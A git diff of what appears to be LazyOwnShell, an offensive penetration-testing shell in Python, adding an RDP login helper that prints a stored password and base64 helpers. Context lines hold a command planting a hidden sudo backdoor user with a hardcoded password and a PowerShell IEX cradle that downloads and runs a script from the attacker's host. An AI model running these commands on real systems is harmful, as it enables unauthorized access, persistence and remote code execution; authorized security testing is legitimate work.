@@ -2211,7 +2211,7 @@ class LazyOwnShell(Cmd):
         else:
             self.custom_prompt = getprompt().replace(']', f"]{YELLOW}[{MAGENTA}{rhost}{YELLOW}][{GREEN}{cwd}{YELLOW}]")
             self.prompt = f"{self.custom_prompt}"
-            os.system(f"echo '{rhost}' | xclip -sel clip")
+            os.system(f"printf '{rhost}' | xclip -sel clip")
             print_msg(f"ip from payload: {rhost=}, copied to clipboard :) {RESET}")
         return
 
@@ -3066,6 +3066,127 @@ class LazyOwnShell(Cmd):
         os.system(f"sudo tcpdump -i {line} icmp -n")
         return
 
+    def do_rdp(self, line):
+        """
+        Reads credentials from a file, encrypts the password, and executes the RDP connection command.
+
+        1. Reads credentials:
+            - Reads the username and password from the `sessions/credentials.txt` file.
+
+        2. Encrypts the password:
+            - Uses `remmina --encrypt-password` to encrypt the password obtained from the file.
+
+        3. Executes the RDP connection command:
+            - Uses the encrypted password to construct and execute the `remmina -c` command to initiate the RDP connection.
+
+        :param line: This function does not use any arguments.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        To manually execute the command:
+        - Ensure `sessions/credentials.txt` contains the credentials in the format `username:password`.
+        - Run the `rdp` command to read the credentials, encrypt the password, and connect to the RDP server.
+        Example usage: `rdp`
+        """
+        path = os.getcwd()
+        credentials_file = f'{path}/sessions/credentials.txt'
+        
+        if not os.path.isfile(credentials_file):
+            print_error("Error: Credentials file not found.")
+            return
+        
+        with open(credentials_file, 'r') as file:
+            credentials = file.readline().strip()
+        
+        if not credentials:
+            print_error("Error: No credentials found in the file.")
+            return
+        
+        # Split credentials into username and password
+        try:
+            username, password = credentials.split(':')
+        except ValueError:
+            print_error("Error: Invalid credentials format in the file.")
+            return
+        
+        rhost = self.params['rhost']
+        
+        if not check_rhost(rhost):
+            print_error("Error: Invalid or undefined rhost.")
+            return
+
+        # Construct and execute the remmina command
+        remmina_command = f'remmina -c rdp://{username}@{rhost}'
+        password = password.replace('\r', '').replace('\n', '').splitlines()[0]
+        print_msg(password)
+        command = f'printf "{password}" | xclip -sel clip'
+        os.system(command)
+        
+        print_msg(f"Executing command: {remmina_command}")
+        try:
+            subprocess.run(remmina_command, shell=True, check=True)
+        except subprocess.CalledProcessError as e:
+            print_error(f"Error executing remmina command: {e}")
+        return
+
+    def do_base64encode(self, line):
+        """
+        Encodes a given string into Base64 format.
+
+        1. Encodes the input string:
+            - Uses the `base64` library to encode the provided string into Base64 format.
+
+        2. Displays the encoded string:
+            - Prints the Base64 encoded string to the terminal.
+
+        :param line: The string to encode in Base64 format.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        To manually encode a string in Base64:
+        - Provide the string to the command and it will print the Base64 encoded result.
+        Example usage: `base64encode HelloWorld`
+        """
+        if line:
+            # Encode the input line to Base64
+            encoded_bytes = base64.b64encode(line.encode('utf-8'))
+            encoded_str = encoded_bytes.decode('utf-8')
+            print_msg(encoded_str)
+        else:
+            print_error("Error: No input provided for encoding.")
+
+    def do_base64decode(self, line):
+        """
+        Decodes a Base64 encoded string.
+
+        1. Decodes the Base64 string:
+            - Uses the `base64` library to decode the provided Base64 encoded string back to its original form.
+
+        2. Displays the decoded string:
+            - Prints the decoded string to the terminal.
+
+        :param line: The Base64 encoded string to decode.
+        :type line: str
+        :returns: None
+
+        Manual execution:
+        To manually decode a Base64 encoded string:
+        - Provide the Base64 encoded string to the command and it will print the decoded result.
+        Example usage: `base64decode SGVsbG9Xb3JsZA==`
+        """
+        if line:
+            try:
+                # Decode the Base64 encoded line
+                decoded_bytes = base64.b64decode(line)
+                decoded_str = decoded_bytes.decode('utf-8')
+                print_msg(decoded_str)
+            except Exception as e:
+                print_error(f"Error decoding Base64 string: {e}")
+        else:
+            print_error("Error: No input provided for decoding.")
+
     def do_grisun0(self, line):
         """
         Creates and copies a shell command to add a new user `grisun0`, set a password, add the user to the sudo group, and switch to the user.
@@ -3088,7 +3209,7 @@ class LazyOwnShell(Cmd):
         """
 
         print_msg(f"{WHITE}useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0{RESET} ")
-        os.system(f"echo \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0\" | xclip -sel clip")
+        os.system(f"printf \"useradd -m -d /home/.grisun0 -s /bin/bash grisun0 && echo 'grisun0:grisgrisgris' | chpasswd && usermod -aG sudo grisun0 && chmod 700 /home/.grisun0 && su - grisun0\" | xclip -sel clip")
         print_warn("Copied to clip ;)")
         return
 
@@ -3134,10 +3255,10 @@ class LazyOwnShell(Cmd):
             return
 
         os.system(
-            f"echo -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip"
+            f"printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\"  iconv -t utf-16le | base64 -w 0 | xclip -sel clip"
         )
         print_msg(
-            f"Try... echo -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\" | iconv -t utf-16le | base64"
+            f"Try... printf -n\"IEX(New-Object New.WebClient).downloadString('http://{lhost}/{line}')\" | iconv -t utf-16le | base64"
         )
         print_msg("copied to clipboard")
         return
@@ -3194,8 +3315,8 @@ class LazyOwnShell(Cmd):
         # Convierte el resultado a una cadena y elimina el salto de línea final
         base64_string = base64_encoded.decode("utf-8").strip()
         cmdd = f"""powershell -e {base64_string}"""
-        os.system(f'echo "{cmdd}" | xclip -sel clip')
-        print_msg(f'echo "{cmdd}" | xclip -sel clip')
+        os.system(f'printf "{cmdd}" | xclip -sel clip')
+        print_msg(f'printf "{cmdd}" | xclip -sel clip')
 
         return
 
